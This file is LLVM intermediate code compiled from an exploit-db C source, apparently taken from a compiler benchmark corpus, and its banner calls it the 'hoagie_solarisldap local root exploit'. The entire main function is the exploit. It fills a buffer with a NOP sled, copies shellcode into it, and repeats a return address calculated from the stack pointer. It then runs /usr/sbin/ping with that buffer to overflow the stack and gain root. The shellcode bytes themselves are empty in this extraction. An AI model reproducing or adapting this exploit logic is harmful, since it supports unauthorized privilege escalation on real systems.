; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_4.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_4.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"hoagie_solarisldap local root exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [18 x i8] c"[*] offset: 0x%x\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [26 x i8] c"[*] return address: 0x%x\0A\00", align 1
@ORIGSIZE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [15 x i8] c"/usr/sbin/ping\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ping\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [512 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 9208, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp sgt i32 %10, 1
  br i1 %11, label %12, label %17

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 1
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 @sscanf(i8* %15, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i32* %7)
  br label %17

17:                                               ; preds = %12, %2
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %19 = load i32, i32* %7, align 4
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.2, i64 0, i64 0), i32 %19)
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %22 = load i32, i32* @NOP, align 4
  %23 = call i32 @memset(i8* %21, i32 %22, i32 512)
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 28
  store i8 -21, i8* %24, align 4
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 29
  store i8 30, i8* %25, align 1
  store i32 0, i32* %9, align 4
  br label %26

26:                                               ; preds = %41, %17
  %27 = load i32, i32* %9, align 4
  %28 = load i8*, i8** @shellcode, align 8
  %29 = call i32 @strlen(i8* %28)
  %30 = icmp slt i32 %27, %29
  br i1 %30, label %31, label %44

31:                                               ; preds = %26
  %32 = load i8*, i8** @shellcode, align 8
  %33 = load i32, i32* %9, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %32, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i32, i32* %9, align 4
  %38 = add nsw i32 %37, 60
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %36, i8* %40, align 1
  br label %41

41:                                               ; preds = %31
  %42 = load i32, i32* %9, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %9, align 4
  br label %26

44:                                               ; preds = %26
  %45 = call i32 (...) @getsp()
  %46 = load i32, i32* %7, align 4
  %47 = sub nsw i32 %45, %46
  store i32 %47, i32* %8, align 4
  %48 = load i32, i32* %8, align 4
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i32 %48)
  store i32 0, i32* %9, align 4
  br label %50

50:                                               ; preds = %93, %44
  %51 = load i32, i32* %9, align 4
  %52 = icmp slt i32 %51, 100
  br i1 %52, label %53, label %96

53:                                               ; preds = %50
  %54 = load i32, i32* %8, align 4
  %55 = and i32 %54, 255
  %56 = trunc i32 %55 to i8
  %57 = load i32, i32* %9, align 4
  %58 = load i32, i32* @ORIGSIZE, align 4
  %59 = add nsw i32 %57, %58
  %60 = add nsw i32 %59, 2
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %61
  store i8 %56, i8* %62, align 1
  %63 = load i32, i32* %8, align 4
  %64 = ashr i32 %63, 8
  %65 = and i32 %64, 255
  %66 = trunc i32 %65 to i8
  %67 = load i32, i32* %9, align 4
  %68 = load i32, i32* @ORIGSIZE, align 4
  %69 = add nsw i32 %67, %68
  %70 = add nsw i32 %69, 3
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %71
  store i8 %66, i8* %72, align 1
  %73 = load i32, i32* %8, align 4
  %74 = ashr i32 %73, 16
  %75 = and i32 %74, 255
  %76 = trunc i32 %75 to i8
  %77 = load i32, i32* %9, align 4
  %78 = load i32, i32* @ORIGSIZE, align 4
  %79 = add nsw i32 %77, %78
  %80 = add nsw i32 %79, 0
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %81
  store i8 %76, i8* %82, align 1
  %83 = load i32, i32* %8, align 4
  %84 = ashr i32 %83, 24
  %85 = and i32 %84, 255
  %86 = trunc i32 %85 to i8
  %87 = load i32, i32* %9, align 4
  %88 = load i32, i32* @ORIGSIZE, align 4
  %89 = add nsw i32 %87, %88
  %90 = add nsw i32 %89, 1
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %91
  store i8 %86, i8* %92, align 1
  br label %93

93:                                               ; preds = %53
  %94 = load i32, i32* %9, align 4
  %95 = add nsw i32 %94, 4
  store i32 %95, i32* %9, align 4
  br label %50

96:                                               ; preds = %50
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %98 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8* %97, i32* null)
  %99 = load i32, i32* %3, align 4
  ret i32 %99
}

declare dso_local i32 @sscanf(i8*, i8*, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @getsp(...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
